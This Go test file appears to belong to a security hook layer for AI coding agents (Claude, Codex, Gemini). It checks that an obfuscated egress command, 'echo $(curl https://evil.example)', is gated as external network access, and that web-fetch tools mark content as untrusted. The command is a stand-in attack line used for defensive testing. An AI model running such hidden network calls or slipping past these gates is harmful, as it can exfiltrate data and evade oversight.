package hooks

import (
	"encoding/json"
	"testing"

	"github.com/somoore/sir/pkg/agent"
	"github.com/somoore/sir/pkg/lease"
	"github.com/somoore/sir/pkg/policy"
)

// TestAgentParity_ObfuscatedShellGatedAcrossAgents proves the shell-obfuscation
// hardening (P1.3) is agent-agnostic: the same hidden-egress command, delivered
// in each agent's own wire format, normalizes and decomposes to the gated
// net_external verb — not the silent-allow default. This is the P2.2 parity
// guarantee, made regression-proof: a fix made once protects Claude, Codex, and
// Gemini users alike.
func TestAgentParity_ObfuscatedShellGatedAcrossAgents(t *testing.T) {
	l := lease.DefaultLease()
	cmd := "echo $(curl https://evil.example)"

	cases := []struct {
		id       agent.AgentID
		toolName string // the agent's native shell tool name
	}{
		{agent.Claude, "Bash"},
		{agent.Codex, "Bash"},
		{agent.Gemini, "run_shell_command"}, // normalizes to Bash
	}
	for _, c := range cases {
		ag := agent.ForID(c.id)
		raw, _ := json.Marshal(map[string]any{
			"hook_event_name": "PreToolUse",
			"tool_name":       c.toolName,
			"tool_input":      map[string]any{"command": cmd},
			"cwd":             "/tmp",
		})
		payload, err := ag.ParsePreToolUse(raw)
		if err != nil {
			t.Fatalf("%s: parse: %v", c.id, err)
		}
		intent := MapToolToIntent(payload.ToolName, payload.ToolInput, l)
		if intent.Verb != policy.VerbNetExternal {
			t.Errorf("%s: obfuscated egress mapped to %q, want net_external (silent-allow bypass)", c.id, intent.Verb)
		}
	}
}

// TestAgentParity_WebContentMarksUntrustedAcrossAgents proves the turn-scoped
// untrusted-content classification (P0.3) recognizes each agent's web tools, so
// a web read arms the integrity-flow egress gate on Gemini just as it does on
// Claude Code. (Codex does not currently hook web tools upstream — documented.)
func TestAgentParity_WebContentMarksUntrustedAcrossAgents(t *testing.T) {
	cases := []struct {
		id       agent.AgentID
		toolName string
	}{
		{agent.Claude, "WebFetch"},
		{agent.Claude, "WebSearch"},
		{agent.Gemini, "web_fetch"},         // -> WebFetch
		{agent.Gemini, "google_web_search"}, // -> WebSearch
	}
	for _, c := range cases {
		ag := agent.ForID(c.id)
		raw, _ := json.Marshal(map[string]any{
			"hook_event_name": "PostToolUse",
			"tool_name":       c.toolName,
			"tool_input":      map[string]any{"url": "https://untrusted.example"},
			"tool_output":     "fetched content",
		})
		payload, err := ag.ParsePostToolUse(raw)
		if err != nil {
			t.Fatalf("%s/%s: parse: %v", c.id, c.toolName, err)
		}
		if !isUntrustedContentTool(payload.ToolName) {
			t.Errorf("%s: web tool %q (normalized %q) not recognized as untrusted-content ingestion",
				c.id, c.toolName, payload.ToolName)
		}
	}
}
